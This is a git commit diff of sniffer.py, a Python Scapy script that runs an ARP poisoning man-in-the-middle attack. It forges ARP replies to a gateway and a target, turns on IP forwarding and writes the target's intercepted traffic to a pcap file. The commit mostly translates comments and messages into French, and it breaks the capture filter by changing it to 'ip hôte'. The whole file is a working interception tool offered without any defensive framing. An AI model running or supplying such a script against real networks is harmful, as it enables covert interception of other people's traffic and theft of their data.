8fca0d5259bae40cf5ebd109cb21f047d55cba97
DevilZArkbird <36197707+DevilZArkbird@users.noreply.github.com>
2018-02-07 16:33:43 +0100

    Add files via upload

--- sniffer.py
+++ sniffer.py
@@ -1,12 +1,12 @@
+ # -*-coding:Latin-1 -*
 
-#Chargement des librairies
 from scapy.all import *
 import os
 import signal
 import sys
 import threading
 import time
-
+#Chargement des librairies
 
 #Paramétrage des variables
 gateway_ip = "192.168.0.254"
@@ -15,50 +15,52 @@ packet_count = 1000
 conf.iface = "eth0"
 conf.verb = 0
 
-#Obtenir l'adresse mac de l'adresse ip cible
-def get_mac(ip_address):
-    # CréatARP request is constructed. sr function is used to send/ receive a layer 3 packet
-    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
-    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
-    for s,r in resp:
-        return r[ARP].hwsrc
-    return None
+#Définition des fonctions
+
 
 #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
 #correct MAC and IP Address information
 def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
-    print("[*] Disabling IP forwarding")
-    #Disable IP Forwarding on a mac
+    print("[*] Déactive IP Forwarding")
+    #Déactive IP Forwarding 
     os.system("sysctl -w net.inet.ip.forwarding=0")
-    #kill process on a mac
+    #supprime le processus
     os.kill(os.getpid(), signal.SIGTERM)
 
-#Keep sending false ARP replies to put our machine in the middle to intercept packets
-#This will use our interface MAC address as the hwsrc for the ARP reply
+#Obtenir l'adresse mac de l'adresse ip cible
+def get_mac(ip_address):
+    # Création des requêtes ARP 
+    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
+    for s,r in resp:
+        return r[ARP].hwsrc
+    return None
+
+#Envoi l'arp à la cible
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
-    print("[*] Started ARP poison attack [CTRL-C to stop]")
+    print("[*] Envoi l'arp à la cible [CTRL-C to stop]")
     try:
         while True:
             send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
             send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
             time.sleep(2)
     except KeyboardInterrupt:
-        print("[*] Stopped ARP poison attack. Restoring network")
+        print("[*] Stop l'arp à la cible Restauration du réseau")
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
-#Start the script
-print("[*] Starting script: arp_poison.py")
-print("[*] Enabling IP forwarding")
-#Enable IP Forwarding on a mac
+#Execution du code
+#Start
+print("[*] Initialisation du script: sniffer.py")
+print("[*] Active IP Forwarding")
+#Acitve IP Forwarding o
 os.system("sysctl -w net.inet.ip.forwarding=1")
-print("[*] Gateway IP address: {gateway_ip}")
-print("[*] Target IP address: {target_ip}")
+print("[*] Gateway IP: {gateway_ip}")
+print("[*] Target IP: {target_ip}")
 
 gateway_mac = get_mac(gateway_ip)
 if gateway_mac is None:
-    print("[!] Unable to get gateway MAC address. Exiting..")
+    print("[!] Impossible d'obtenir l'adresse MAC de lagateway. Bye..")
     sys.exit(0)
 else:
     print("[*] Gateway MAC address: {gateway_mac}")
@@ -68,7 +70,7 @@ if target_mac is None:
     print("[!] Unable to get target MAC address. Exiting..")
     sys.exit(0)
 else:
-    print("[*] Target MAC address: {target_mac}")
+    print("[*] Target MAC : {target_mac}")
 
 #ARP poison thread
 poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
@@ -76,15 +78,16 @@ poison_thread.start()
 
 #Sniff traffic and write to file. Capture is filtered on target machine
 try:
-    sniff_filter = "ip host " + target_ip
-    print("[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+    sniff_filter = "ip hôte " + target_ip
+    print("[*] Début de la capture réseau. Packet Count: {packet_count}. Filter: {sniff_filter}")
     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
-    wrpcap(target_ip + "_capture.pcap", packets)
-    print("[*] Stopping network capture..Restoring network")
+    wrpcap(target_ip + "_capture.pcap", packets)#Extraction pcap
+    print("[*] Stopping capture..Restauration du réseau")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 except KeyboardInterrupt:
-    print("[*] Stopping network capture..Restoring network")
+    print("[*] Stopping capture..Restauration du réseau")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
-#view raw
+#view raw 
+#debug option
 
